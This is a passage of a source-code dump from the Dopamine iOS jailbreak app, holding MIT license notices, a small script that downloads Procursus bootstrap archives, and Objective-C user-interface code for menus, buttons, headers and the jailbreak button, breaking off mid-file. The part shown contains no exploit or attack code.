MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY 
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, 
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

plooshinit contains parts from Embedded Artistry libc:

MIT License

Copyright (c) 2017 Embedded Artistry

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

plooshinit contains parts of lz4dec:

MIT License

Copyright (c) 2022 Siguza

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

plooshInit contains parts of Dopamine:

MIT License

Copyright (c) 2023 Lars Fröder (opa334)

Permission is hereby granted, free of charge, to any person obtaining a
copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included
in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.


```

`Application/Dopamine/Resources/LICENSE_weightBufs.md`:

```md
MIT License

Copyright (c) 2022 Mohamed Ghannam

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

`Application/Dopamine/Resources/download_bootstraps.sh`:

```sh
set -e

curl -L https://apt.procurs.us/bootstraps/1800/bootstrap-iphoneos-arm64.tar.zst --output bootstrap_1800.tar.zst
curl -L https://apt.procurs.us/bootstraps/1900/bootstrap-iphoneos-arm64.tar.zst --output bootstrap_1900.tar.zst

```

`Application/Dopamine/UI/ActionMenu/DOActionMenuButton.h`:

```h
//
//  DOActionButton.h
//  Dopamine
//
//  Created by tomt000 on 07/01/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOActionMenuButton : UIButton

@property (nonatomic) BOOL bottomSeparator;

+(DOActionMenuButton*)buttonWithAction:(UIAction *)action chevron:(BOOL)chevron;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/ActionMenu/DOActionMenuButton.m`:

```m
//
//  DOActionMenuButton.m
//  Dopamine
//
//  Created by tomt000 on 07/01/2024.
//

#import "DOActionMenuButton.h"
#import "DOGlobalAppearance.h"

@interface DOActionMenuButton () {
    UIView *_separator;
}

@property (nonatomic) UIImpactFeedbackGenerator *feedbackGenerator;

@end

@implementation DOActionMenuButton 

+(DOActionMenuButton*)buttonWithAction:(UIAction *)action chevron:(BOOL)chevron
{
    DOActionMenuButton *button = [DOActionMenuButton buttonWithConfiguration:[DOGlobalAppearance defaultButtonConfiguration] primaryAction:action];
    [button.titleLabel setAdjustsFontSizeToFitWidth:YES];
    [button setContentHorizontalAlignment:UIControlContentHorizontalAlignmentLeft];

    if ([DOGlobalAppearance isRTL])
        [button setContentHorizontalAlignment:UIControlContentHorizontalAlignmentRight];

    if (chevron)
    {
        UIImage *chevronImage = [UIImage systemImageNamed:@"chevron.right"];
        chevronImage = [chevronImage imageWithConfiguration:[UIImageSymbolConfiguration configurationWithPointSize:16 weight:UIImageSymbolWeightRegular]];
        UIImageView *chevronView = [[UIImageView alloc] initWithImage:chevronImage];
        chevronView.translatesAutoresizingMaskIntoConstraints = NO;
        chevronView.tintColor = [UIColor colorWithWhite:1 alpha:0.6];
        [button addSubview:chevronView];
        [NSLayoutConstraint activateConstraints:@[
            [chevronView.trailingAnchor constraintEqualToAnchor:button.trailingAnchor constant:-10],
            [chevronView.centerYAnchor constraintEqualToAnchor:button.centerYAnchor],
        ]];
    }

    button.feedbackGenerator = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleLight];
    [button addTarget:button action:@selector(buttonPressed) forControlEvents:UIControlEventTouchUpInside];

    return button;
}

-(void)buttonPressed
{
    [self.feedbackGenerator impactOccurred];
}

-(void)setBottomSeparator:(BOOL)bottomSeparator
{
    _bottomSeparator = bottomSeparator;
    if (_separator)
        [_separator removeFromSuperview];
    if (bottomSeparator)
    {
        _separator = [[UIView alloc] init];
        _separator.backgroundColor = [UIColor colorWithWhite:0.6 alpha:0.3];
        _separator.translatesAutoresizingMaskIntoConstraints = NO;
        _separator.layer.cornerRadius = 0.5;
        _separator.layer.masksToBounds = YES;
        [self addSubview:_separator];
        [NSLayoutConstraint activateConstraints:@[
            [_separator.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:10],
            [_separator.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-10],
            [_separator.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
            [_separator.heightAnchor constraintEqualToConstant:1],
        ]];
    }
}

@end

```

`Application/Dopamine/UI/ActionMenu/DOActionMenuDelegate.h`:

```h
//
//  DOActionMenuDelegate.h
//  Dopamine
//
//  Created by tomt000 on 13/01/2024.
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@protocol DOActionMenuDelegate <NSObject>

- (BOOL)actionMenuShowsChevronForAction:(UIAction *)action;
- (BOOL)actionMenuActionIsEnabled:(UIAction *)action;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/ActionMenu/DOActionMenuView.h`:

```h
//
//  DOActionMenuView.h
//  Dopamine
//
//  Created by tomt000 on 04/01/2024.
//

#import <UIKit/UIKit.h>
#import "DOActionMenuDelegate.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOActionMenuView : UIView

@property (atomic) UIStackView *buttonsView;
@property (atomic) id<DOActionMenuDelegate> delegate;
@property (nonatomic) NSArray *actions;

- (instancetype)initWithActions:(NSArray<UIAction*> *)actions delegate:(id<DOActionMenuDelegate>)delegate;
- (void)hide;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/ActionMenu/DOActionMenuView.m`:

```m
//
//  DOActionMenuView.m
//  Dopamine
//
//  Created by tomt000 on 04/01/2024.
//

#import "DOActionMenuView.h"
#import "DOActionMenuButton.h"
#import "DOGlobalAppearance.h"
#import "DOThemeManager.h"

@implementation DOActionMenuView

- (instancetype)initWithActions:(NSArray<UIAction*> *)actions delegate:(id<DOActionMenuDelegate>)delegate
{
    if (self = [super init])
    {
        [self setDelegate:delegate];
        [self setActions:actions];
        self.backgroundColor = [DOThemeManager menuColorWithAlpha:1.0];
        self.layer.cornerRadius = 14;
        self.layer.masksToBounds = YES;
        self.layer.cornerCurve = kCACornerCurveContinuous;
    }
    return self;
}

- (void)setActions:(NSArray *)actions
{
    _actions = actions;
    dispatch_async(dispatch_get_main_queue(), ^{
        [self refreshStack];
    });
}

-(void)refreshStack
{
    [self.buttonsView removeFromSuperview];
    self.buttonsView = [[UIStackView alloc] init];
    self.buttonsView.axis = UILayoutConstraintAxisVertical;
    self.buttonsView.translatesAutoresizingMaskIntoConstraints = NO;

    int button_height = [DOGlobalAppearance isHomeButtonDevice] ? UI_ACTION_HEIGHT_HOME_BTN : UI_ACTION_HEIGHT;
    if ([DOGlobalAppearance isSmallDevice])
        button_height = UI_ACTION_HEIGHT_TINY;

    [self.actions enumerateObjectsUsingBlock:^(UIAction *action, NSUInteger idx, BOOL *stop) {
        DOActionMenuButton *button = [DOActionMenuButton buttonWithAction:action chevron:[self.delegate actionMenuShowsChevronForAction:action]];
        button.enabled = [self.delegate actionMenuActionIsEnabled:action];
        [button setBottomSeparator:idx != self.actions.count - 1];
        [self.buttonsView addArrangedSubview:button];
        [NSLayoutConstraint activateConstraints:@[
            [button.heightAnchor constraintEqualToConstant:button_height],
            [button.widthAnchor constraintEqualToAnchor:self.buttonsView.widthAnchor]
        ]];
    }];

    [self addSubview:self.buttonsView];

    int inner_padding = [DOGlobalAppearance isSmallDevice] ? UI_INNER_PADDING_TINY : UI_INNER_PADDING;

    [NSLayoutConstraint activateConstraints:@[
        [self.buttonsView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:inner_padding],
        [self.buttonsView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-inner_padding],
        [self.buttonsView.topAnchor constraintEqualToAnchor:self.topAnchor constant:UI_INNER_TOP_PADDING],
        [self.buttonsView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor constant:-UI_INNER_TOP_PADDING],
    ]];

}

- (void)hide
{
    [self setUserInteractionEnabled:NO];
    CGAffineTransform transform = CGAffineTransformMakeTranslation(0, -75);
    transform = CGAffineTransformScale(transform, 0.6, 0.6);
    [UIView animateWithDuration:0.3 delay:0.0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0  options: UIViewAnimationOptionCurveEaseInOut animations:^{
        [self setAlpha:0.0];
        [self setTransform:transform];
    } completion:nil];
}

@end

```

`Application/Dopamine/UI/DOGlobalAppearance.h`:

```h
//
//  GlobalAppearance.h
//  Dopamine
//
//  Created by Lars Fröder on 10.10.23.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

#define UI_IPAD_MAX_WIDTH 600
#define UI_MODAL_PADDING 30
#define UI_PADDING 30
//Action Menu
#define UI_INNER_PADDING 20
#define UI_INNER_PADDING_TINY 10
#define UI_INNER_TOP_PADDING 5
#define UI_ACTION_HEIGHT 73
#define UI_ACTION_HEIGHT_HOME_BTN 65
#define UI_ACTION_HEIGHT_TINY 52

#define SE_PHONE_SIZE_CONST 568

@interface DOGlobalAppearance : NSObject

+ (UIImageSymbolConfiguration *)smallIconImageConfiguration;
+ (UIButtonConfiguration *)defaultButtonConfiguration;
+ (UIButtonConfiguration *)defaultButtonConfigurationWithImagePadding:(CGFloat)imagePadding;
+ (NSAttributedString*)mainSubtitleString:(NSString*)string;
+ (NSAttributedString*)secondarySubtitleString:(NSString*)string;
+ (BOOL)isHomeButtonDevice;
+ (UIColor*)windowColorWithAlpha:(float)alpha;
+ (BOOL)isRTL;
+ (BOOL)isSmallDevice;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/DOGlobalAppearance.m`:

```m
//
//  GlobalAppearance.m
//  Dopamine
//
//  Created by Lars Fröder on 10.10.23.
//

#import "DOGlobalAppearance.h"
#import <CoreGraphics/CoreGraphics.h>
#import "DOThemeManager.h"

@implementation DOGlobalAppearance

+ (UIImageSymbolConfiguration *)smallIconImageConfiguration
{
    return [UIImageSymbolConfiguration configurationWithPointSize: 14 weight:UIImageSymbolWeightMedium];
}

+ (UIButtonConfiguration *)defaultButtonConfiguration
{
    UIButtonConfiguration *configuration = [UIButtonConfiguration plainButtonConfiguration];
    configuration.imagePadding = 10;
    configuration.baseForegroundColor = [UIColor whiteColor];
    configuration.titleLineBreakMode = NSLineBreakByClipping;

    // IN DARK MODE, APPLE JUST ADDS WHITE WHEN A BUTTON IS HIGHLIGHTED WHEN IT'S SET UP VIA UIButtonConfiguration
    // UNFORTUNATELY THEY FORGOT ABOUT THE POSSIBILITY ABOUT THERE BEING A WHITE BUTTON, SO THOSE JUST DON'T SHOW ANY HIGHLIGHT COLOR
    // HACKY WORKAROUND TO FIX FIX THIS MESS; SCREW APPLE
    configuration.titleTextAttributesTransformer = ^NSDictionary<NSAttributedStringKey,id> * _Nonnull(NSDictionary<NSAttributedStringKey,id> * _Nonnull textAttributes) {
        // Something makes me think the person that developed this API never actually used it...
        // OR ELSE WHERE IS MY BUTTON REFERENCE TO KNOW WHAT STATE I'M EVEN DEALING WITH???
        // THIS IS A SUPER HACKY WAY OF DETERMINING WHETHER THE BUTTON IS HIGHLIGHTED OR NOT
        // WHEN IT'S HIGHLIGHTED THE COLOR WILL BE IN UIExtendedSRGBColorSpace
        // WHEN NOT HIGHLIGHTED IT WILL BE IN UIExtendedGrayColorSpace
        // WHEN NOT IN DARK MODE IT WILL ALREADY BE WHAT WE WANT, JUST SKIP
        NSMutableDictionary<NSAttributedStringKey,id> *textAttributesM = textAttributes.mutableCopy;
        UIColor *foregroundColor = textAttributes[NSForegroundColorAttributeName];
        CGFloat alpha, white;
        [foregroundColor getWhite:&white alpha:&alpha];
        if ((int)white == 1 && (int)alpha == 1) {
            CGColorSpaceRef colorSpace = CGColorGetColorSpace(foregroundColor.CGColor);
            CGColorSpaceModel model = CGColorSpaceGetModel(colorSpace);
            if (model == kCGColorSpaceModelRGB) {
                textAttributesM[NSForegroundColorAttributeName] = [[UIColor whiteColor] colorWithAlphaComponent:0.75];
            }
        }
        // textAttributesM[NSFontAttributeName] = [UIFont systemFontOfSize:16 weight:UIFontWeightMedium];
        return textAttributesM;
    };
    configuration.imageColorTransformer = ^UIColor * _Nonnull(UIColor * _Nonnull color) {
        // Something makes me think the person that developed this API never actually used it...
        // OR ELSE WHERE IS MY BUTTON REFERENCE TO KNOW WHAT STATE I'M EVEN DEALING WITH???
        // THIS IS A SUPER HACKY WAY OF DETERMINING WHETHER THE BUTTON IS HIGHLIGHTED OR NOT
        // WHEN IT'S HIGHLIGHTED THE COLOR WILL BE IN UIExtendedSRGBColorSpace
        // WHEN NOT HIGHLIGHTED IT WILL BE IN UIExtendedGrayColorSpace
        // WHEN NOT IN DARK MODE IT WILL ALREADY BE WHAT WE WANT, JUST SKIP
        CGFloat alpha, white;
        [color getWhite:&white alpha:&alpha];
        if ((int)white == 1 && (int)alpha == 1) {
            CGColorSpaceRef colorSpace = CGColorGetColorSpace(color.CGColor);
            CGColorSpaceModel model = CGColorSpaceGetModel(colorSpace);
            if (model == kCGColorSpaceModelRGB) {
                return [color colorWithAlphaComponent:0.75];
            }
        }
        return color;
    };
    
    return configuration;
}

+ (UIButtonConfiguration *)defaultButtonConfigurationWithImagePadding:(CGFloat)imagePadding
{
    UIButtonConfiguration *configuration = [DOGlobalAppearance defaultButtonConfiguration];
    configuration.imagePadding = imagePadding;
    return configuration;
}

#pragma mark - Attributed Strings

+ (NSAttributedString*)mainSubtitleString:(NSString*)string
{
    return [[NSAttributedString alloc] initWithString:string attributes:@{
        NSFontAttributeName: [UIFont systemFontOfSize:14 weight:UIFontWeightMedium],
        NSForegroundColorAttributeName: [UIColor whiteColor],
    }];
}

+ (NSAttributedString*)secondarySubtitleString:(NSString*)string
{
    return [[NSAttributedString alloc] initWithString:string attributes:@{
        NSFontAttributeName: [UIFont systemFontOfSize:14 weight:UIFontWeightRegular],
        NSForegroundColorAttributeName: [UIColor colorWithWhite:1 alpha:0.60],
    }];
}

+ (BOOL)isHomeButtonDevice
{
   return [[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPhone && [[UIApplication sharedApplication] keyWindow].safeAreaInsets.bottom == 0;
}

+ (BOOL)isRTL
{
    return [UIApplication sharedApplication].userInterfaceLayoutDirection == UIUserInterfaceLayoutDirectionRightToLeft;
}

+ (BOOL)isSmallDevice
{
    UIWindow *window = [[UIApplication sharedApplication] keyWindow];
    return window.frame.size.height < SE_PHONE_SIZE_CONST + 50;
}

@end

```

`Application/Dopamine/UI/DOHeaderView.h`:

```h
//
//  DOHeaderView.h
//  Dopamine
//
//  Created by tomt000 on 04/01/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOHeaderView : UIView

-(id)initWithImage:(UIImage *)image subtitles:(NSArray<NSAttributedString *> *)subtitles;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/DOHeaderView.m`:

```m
//
//  DOHeaderView.m
//  Dopamine
//
//  Created by tomt000 on 04/01/2024.
//

#import "DOHeaderView.h"
#import "DOThemeManager.h"

@interface DOHeaderView ()

@property (nonatomic) UIImageView *logoView;

@end

@implementation DOHeaderView

-(id)initWithImage:(UIImage *)image subtitles:(NSArray<NSAttributedString *> *)subtitles {
    if (self = [super init]) {
        UIStackView *stackView = [[UIStackView alloc] init];
        stackView.axis = UILayoutConstraintAxisVertical;
        stackView.spacing = 2;
        stackView.translatesAutoresizingMaskIntoConstraints = NO;
        stackView.alignment = UIStackViewAlignmentLeading;

        [self addSubview:stackView];

        [NSLayoutConstraint activateConstraints:@[
            [stackView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
            [stackView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
            [stackView.topAnchor constraintEqualToAnchor:self.topAnchor],
            [stackView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
        ]];

        //1 - Add the logo to our stack
        self.logoView = [[UIImageView alloc] init];
        self.logoView.translatesAutoresizingMaskIntoConstraints = NO;
        self.logoView.image = [image imageWithAlignmentRectInsets:UIEdgeInsetsMake(7, 0, -7, 0)];
        [stackView addArrangedSubview:self.logoView];

        [NSLayoutConstraint activateConstraints:@[
            [self.logoView.heightAnchor constraintEqualToConstant:40],
            [self.logoView.widthAnchor constraintEqualToAnchor:self.logoView.heightAnchor multiplier:image.size.width / image.size.height],
        ]];

        //3 - Add our subtitles to our stack
        [subtitles enumerateObjectsUsingBlock:^(NSAttributedString *formatedText, NSUInteger idx, BOOL *stop) {
            UILabel *label = [[UILabel alloc] init];
            label.attributedText = formatedText;
            label.translatesAutoresizingMaskIntoConstraints = NO;
            [stackView addArrangedSubview:label];
        }];

        self.translatesAutoresizingMaskIntoConstraints = NO;

        DOTheme *theme = [[DOThemeManager sharedInstance] enabledTheme];
        if (theme.titleShadow)
        {
            self.layer.shadowColor = [UIColor blackColor].CGColor;
            self.layer.shadowOffset = CGSizeZero;
            self.layer.shadowRadius = 30;
            self.layer.shadowOpacity = 0.3;
        }

    }
    return self;
}

@end

```

`Application/Dopamine/UI/DOJailbreakButton.h`:

```h
//
//  DOJailbreakButton.h
//  Dopamine
//
//  Created by tomt000 on 13/01/2024.
//

#import <UIKit/UIKit.h>
#import "DOActionMenuButton.h"
#import "DOLyricsLogView.h"
#import "DODebugLogView.h"
#import "DOPkgManagerPickerView.h"
#import <pthread.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOJailbreakButton : UIView

@property DOActionMenuButton *button;
@property UIView<DOLogViewProtocol> *logView;
@property DOPkgManagerPickerView *pkgManagerPickerView;

@property (nonatomic, getter=isEnabled) BOOL enabled;
@property (nonatomic) BOOL didExpand;
@property (nonatomic, assign) pthread_mutex_t canStartJailbreak;

- (instancetype)initWithAction:(UIAction *)actions;
- (void)expandButton:(NSArray<NSLayoutConstraint *> *)constraints;

- (void)lockMutex;
- (void)unlockMutex;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/DOJailbreakButton.m`:

```m
//
//  DOJailbreakButton.m
//  Dopamine
//
//  Created by tomt000 on 13/01/2024.
//

#import "DOJailbreakButton.h"
#import "DODoubleHelixIndicator.h"
#import "DOUIManager.h"
#import "DOGlobalAppearance.h"
#import "DOThemeManager.h"

@implementation DOJailbreakButton

- (instancetype)initWithAction:(UIAction *)actions
{
    if (self = [super init])
    {
        self.backgroundColor = [DOThemeManager menuColorWithAlpha:1.0];
        self.layer.cornerRadius = 14;
        self.layer.masksToBounds = YES;
        self.layer.cornerCurve = kCACornerCurveContinuous;
        self.translatesAutoresizingMaskIntoConstraints = NO;

        self.button = [DOActionMenuButton buttonWithAction:actions chevron:NO];
        [self.button setContentHorizontalAlignment:UIControlContentHorizontalAlignmentCenter];
        self.button.translatesAutoresizingMaskIntoConstraints = NO;
        [self addSubview:self.button];
        [NSLayoutConstraint activateConstraints:@[
            [self.button.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
            [self.button.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
            [self.button.topAnchor constraintEqualToAnchor:self.topAnchor],
            [self.button.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
        ]];
    }
    return self;
}

- (void)expandButton:(NSArray<NSLayoutConstraint *> *)constraints
{
    if (self.didExpand)
        return;

    //We're doing some setup, let's lock the mutex
    [self lockMutex];
        
    self.didExpand = TRUE;

    UIWindow *window = [[UIApplication sharedApplication] keyWindow];

    float topPadding = (window.frame.size.height * (1 - 0.74));
    topPadding += 35;
    
    [self setupLog: topPadding];
    [self setupPackageManagerPicker: topPadding];
    
    [NSLayoutConstraint deactivateConstraints:constraints];


    [NSLayoutConstraint activateConstraints:@[
        [self.leadingAnchor constraintEqualToAnchor:window.leadingAnchor],
        [self.trailingAnchor constraintEqualToAnchor:window.trailingAnchor],
        [self.topAnchor constraintEqualToAnchor:window.topAnchor constant:topPadding],
        [self.bottomAnchor constraintEqualToAnchor:window.bottomAnchor constant:100] // slightly out of the screen to hide corners on i8
    ]];
    
    [self.button setUserInteractionEnabled:NO];

    [UIView animateWithDuration: 0.2 animations:^{ [self.button setAlpha:0.0]; }];
    [UIView animateWithDuration:0.75 delay:0.0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0  options: UIViewAnimationOptionCurveEaseInOut animations:^{
        [window layoutIfNeeded];
        [self.button setAlpha:0.0];
    } completion:nil];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.25 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [self setupTitle];
    });

    if ([[DOUIManager sharedInstance] enabledPackageManagerKeys].count > 0)
    {
        //we can start, unlock the mutex
        [self unlockMutex];
    }

}

- (void)setupLog: (float)topPadding
{
    UIWindow *window = [[UIApplication sharedApplication] keyWindow];

    if ([[DOUIManager sharedInstance] isDebug])
        self.logView = [[DODebugLogView alloc] init];
    else
        self.logView = [[DOLyricsLogView alloc] init];
    
    [[DOUIManager sharedInstance] setLogView:self.logView];

    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    [self addSubview:self.logView];

    [NSLayoutConstraint activateConstraints:@[
        [self.logView.leadingAnchor constraintEqualToAnchor:window.leadingAnchor],
        [self.logView.trailingAnchor constraintEqualToAnchor:window.trailingAnchor],
        [self.logView.topAnchor constraintEqualToAnchor:window.topAnchor constant:topPadding],
        [self.logView.bottomAnchor constraintEqualToAnchor:window.bottomAnchor constant:0]
    ]];

    [window layoutIfNeeded];
}

- (void)setupPackageManagerPicker: (float)topPadding
{
    UIWindow *window = [[UIApplication sharedApplication] keyWindow];

    if ([[DOUIManager sharedInstance] enabledPackageManagerKeys].count > 0)
        return;

    self.pkgManagerPickerView = [[DOPkgManagerPickerView alloc] initWithCallback:^(BOOL success) {
        [self.pkgManagerPickerView removeFromSuperview];
        self.logView.hidden = NO;
        [self unlockMutex];
    }];

    self.pkgManagerPickerView.translatesAutoresizingMaskIntoConstraints = NO;
    self.pkgManagerPickerView.alpha = 0.0;

    [self addSubview:self.pkgManagerPickerView];

    [NSLayoutConstraint activateConstraints:@[
       [self.pkgManagerPickerView.leadingAnchor constraintEqualToAnchor:window.leadingAnchor],
       [self.pkgManagerPickerView.trailingAnchor constraintEqualToAnchor:window.trailingAnchor],
       [self.pkgManagerPickerView.topAnchor constraintEqualToAnchor:window.topAnchor constant:topPadding],
       [self.pkgManagerPickerView.bottomAnchor constraintEqualToAnchor:window.bottomAnchor constant:0]
    ]];
    
    [UIView animateWithDuration:0.25 delay:0.25 options: UIViewAnimationOptionCurveEaseInOut animations:^{
        self.pkgManagerPickerView.alpha = 1.0;
    } completion:nil];

    [window layoutIfNeeded];
}

- (void)setupTitle
{
    UIWindow *window = [[UIApplication sharedApplication] keyWindow];

    UILabel *titleLabel = [[UILabel alloc] init];
    titleLabel.translatesAutoresizingMaskIntoConstraints = NO;
    titleLabel.text = DOLocalizedString(@"Status_Title_Jailbreaking");
    titleLabel.textColor = [UIColor whiteColor];
    titleLabel.font = [UIFont systemFontOfSize:18 weight:UIFontWeightRegular];
    titleLabel.textAlignment = NSTextAlignmentCenter;
    titleLabel.alpha = 0.0;
    [self addSubview:titleLabel];

    [NSLayoutConstraint activateConstraints:@[
        [titleLabel.centerXAnchor constraintEqualToAnchor:window.centerXAnchor constant:20],
        [titleLabel.topAnchor constraintEqualToAnchor:self.topAnchor constant:20],
    ]];

    [UIView animateWithDuration:0.2 animations:^{
        titleLabel.alpha = 1.0;
    }];

    DODoubleHelixIndicator *indicator = [[DODoubleHelixIndicator alloc] init];
    [self addSubview:indicator];
    indicator.translatesAutoresizingMaskIntoConstraints = NO;

    [NSLayoutConstraint activateConstraints:@[
        [indicator.trailingAnchor constraintEqualToAnchor:titleLabel.leadingAnchor constant:-10],
        [indicator.centerYAnchor constraintEqualToAnchor:titleLabel.centerYAnchor],
        [indicator.widthAnchor constraintEqualToConstant:30],
        [indicator.heightAnchor constraintEqualToConstant:12],
    ]];
}

- (void)setEnabled:(BOOL)enabled
{
    self.button.userInteractionEnabled = enabled;
    if (enabled) {
        self.alpha = 1.0;
    } else {
        self.alpha = 0.7;
    }
}

- (BOOL)isEnabled
{
    return self.button.userInteractionEnabled;
}

#pragma mark - Mutex

-(void)lockMutex
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        pthread_mutex_init(&self->_canStartJailbreak, NULL);
    });
    pthread_mutex_lock(&self->_canStartJailbreak);
}

-(void)unlockMutex
{
    pthread_mutex_unlock(&self->_canStartJailbreak);
}

@end

```

`Application/Dopamine/UI/DOMainViewController.h`:

```h
//
//  DOMainViewController.h
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import <UIKit/UIKit.h>
#import "DOActionMenuDelegate.h"
#import "DOHeaderView.h"
#import "DOGlobalAppearance.h"
#import "DOActionMenuView.h"
#import "DOCreditsViewController.h"
#import "DOSettingsController.h"
#import "DOJailbreakButton.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOMainViewController : UIViewController <DOActionMenuDelegate>

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/DOMainViewController.m`:

```m
//
//  DOMainViewController.m
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import "DOMainViewController.h"
#import "DOUIManager.h"
#import "DOEnvironmentManager.h"
#import "DOJailbreaker.h"
#import "DOGlobalAppearance.h"
#import "DOActionMenuButton.h"
#import "DOUpdateViewController.h"
#import "DOLogCrashViewController.h"
#import <pthread.h>
#import <libjailbreak/libjailbreak.h>

@interface DOMainViewController ()

@property DOJailbreakButton *jailbreakBtn;
@property NSArray<NSLayoutConstraint *> *jailbreakButtonConstraints;
@property DOActionMenuButton *updateButton;
@property(nonatomic) BOOL hideStatusBar;
@property(nonatomic) BOOL hideHomeIndicator;

@end

@implementation DOMainViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    [self setupStack];
}

-(void)setupStack
{
    UIStackView *stackView = [[UIStackView alloc] init];
    [stackView setAxis:UILayoutConstraintAxisVertical];
    [stackView setAlignment:UIStackViewAlignmentTrailing];
